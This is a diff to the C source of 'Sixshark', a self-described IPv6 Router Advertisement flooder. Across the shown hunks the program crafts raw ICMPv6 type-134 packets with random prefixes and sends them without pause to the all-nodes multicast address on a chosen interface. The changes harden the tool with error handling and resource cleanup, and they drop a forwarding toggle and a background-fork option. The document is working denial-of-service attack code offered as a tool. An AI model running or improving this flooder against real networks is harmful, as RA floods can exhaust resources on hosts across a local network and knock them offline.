@@ -127,8 +127,7 @@ typedef struct Packet
 
 // Function prototypes
 
-bool enable_ipv6_forwarding(int state);
-void print_usage(char *progname);
+void print_usage(const char *progname);
 void stop(int sig);
 void cleanup(Packet *p);
 int lookup_mac(const char *interface, uint8_t *mac);
@@ -145,7 +144,7 @@ int main(int argc, char *argv[])
 {
     if(getuid() != 0)
     {
-        printf("Error: Sixshark requires root priveledges\n");
+        printf("Error: Sixshark requires root privileges\n");
         printf("Try: sudo %s -i <interface>\n", argv[0]);
         return 1;
     }
@@ -157,10 +156,8 @@ int main(int argc, char *argv[])
     char *interface = NULL;
     int delay = 0;
     bool progress = false;
-    bool fork_proc = false;
-    pid_t pid;
 
-    while((opt = getopt(argc, argv, "i:d:f:ph")) != -1)
+    while((opt = getopt(argc, argv, "i:d:ph")) != -1)
     {
         switch(opt)
         {
@@ -172,12 +169,14 @@ int main(int argc, char *argv[])
                 break;
             case 'd':
                 delay = atoi(optarg);
+                if(delay < 0)
+                {
+                    printf("-d requires a positive integer.\n");
+                    exit(1);
+                }
                 break;
             case 'p':
                 progress = true;
-                break;
-            case 'f':
-                fork_proc = true;
                 break;
         }
     }
@@ -190,41 +189,17 @@ int main(int argc, char *argv[])
     }
 
     Packet *p = malloc(sizeof(Packet));
+
     if(!p)
     {
         perror("malloc");
         return 1;
     }
 
-    enable_ipv6_forwarding(1);
     printf("Flooding network...\n");
     run_flood(p, delay, interface, progress);
     cleanup(p);
     return 0;
-}
-
-bool enable_ipv6_forwarding(int state)
-{
-    FILE *fp = fopen("/proc/sys/net/ipv6/conf/all/forwarding", "w");
-    if(!fp)
-    {
-        perror("fopen");
-        return false;
-    }
-    
-    if(state)
-    {
-        printf("Enabling IPv6 forwarding.... ");
-        fprintf(fp, "1");
-    }
-    else
-    {
-        printf("Disabling IPv6 forwarding.... ");
-        fprintf(fp, "0");
-    }
-    fclose(fp);
-    printf(" [OK]\n");
-    return true;
 }
 
 int lookup_mac(const char *interface, uint8_t *mac)
@@ -243,6 +218,7 @@ int lookup_mac(const char *interface, uint8_t *mac)
     if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
     {
         perror("ioctl");
+        close(sock);
         return 0;
     }
 
@@ -262,8 +238,6 @@ int generate_random_prefix(char *prefix)
 
 int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
 {
-    memset(p, 0, sizeof(Packet));
-
     p->icmp6_hdr.type = 134;
     p->icmp6_hdr.code = 0;
     p->icmp6_hdr.checksum = 0;
@@ -299,24 +273,41 @@ int create_packet(Packet *p, const uint8_t *mac, const char *prefix)
 int run_flood(Packet *p, int delay, const char *interface, bool progress)
 {
     int hops = 255;
-    int bufzize = 1024 * 1024;
+    int bufsize = 1024 * 1024;
     int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
     if(sock < 0)
     {
         perror("socket");
-        return 0;
+        return 1;
     }
 
-    setsockopt(sock, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, sizeof(hops));
-    setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops));
-    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufzize, sizeof(bufzize));
+    if(setsockopt(sock, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, sizeof(hops)) < 0)
+    {
+        perror("setsockopt IPV6_UNICAST_HOPS");
+        close(sock);
+        return 1;
+    }
+    if(setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops)) < 0)
+    {
+        perror("setsockopt IPV6_MULTICAST_HOPS");
+        close(sock);
+        return 1;
+    }
+    
+    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)) < 0)
+    {
+        perror("setsockopt SO_SNDBUF");
+        close(sock);
+        return 1;
+    }
 
     char prefix[INET6_ADDRSTRLEN];
     uint8_t mac[6];
 
     if(!lookup_mac(interface, mac))
     {
-        printf("Could not find specified interface.\n");
+        printf("Error: Could not find specified interface.\n");
+        close(sock);
         return 1;
     }
 
@@ -327,12 +318,21 @@ int run_flood(Packet *p, int delay, const char *interface, bool progress)
     inet_pton(AF_INET6, "ff02::1", &dest.sin6_addr);
     dest.sin6_scope_id = if_nametoindex(interface);
 
+    if(dest.sin6_scope_id == 0)
+    {
+        printf("Error: Could not find interface.\n");
+        close(sock);
+        return 1;
+    }
+
     while(keep_running)
     {
         generate_random_prefix(prefix);
+        memset(p, 0, sizeof(Packet));
 
         if(!create_packet(p, mac, prefix))
         {
+            close(sock);
             return 1;
         }
 
@@ -341,13 +341,14 @@ int run_flood(Packet *p, int delay, const char *interface, bool progress)
         {
             if(errno == ENOBUFS)
             {
-                usleep(50);
+                usleep(1000);
                 continue;
             }
             perror("sendto");
-            return 0;
+            close(sock);
+            return 1;
         }
-        if(progress == true)
+        if(progress)
         {
             printf(".");
             fflush(stdout);
@@ -367,14 +368,13 @@ void stop(int sig)
 void cleanup(Packet *p)
 {
     printf("\n\nCleaning up...\n");
-    enable_ipv6_forwarding(0);
     free(p);
 }
 
-void print_usage(char *progname)
+void print_usage(const char *progname)
 {
     printf("Sixshark - IPv6 RA Flooder\n\n");
-    printf("Usage: sudo %s -i <interface> [-d -p -f -h]\n", progname);
+    printf("Usage: sudo %s -i <interface> [-d -p -h]\n", progname);
     printf("\n");
     printf("Required:\n");
     printf(" -i <interface>  Network interface to use (e.g., eth0, wlan0)\n");
@@ -383,7 +383,6 @@ void print_usage(char *progname)
     printf(" -d <int>   Delay between sending packets (in seconds)\n");
     printf(" -p         Print to screen when packet is sent\n");
     printf(" -h         Display this help message\n");
-    printf(" -f         Run attack in the background (fork)\n");
     printf("\n");
     printf("Press Ctrl+C to stop flood.\n");
 }
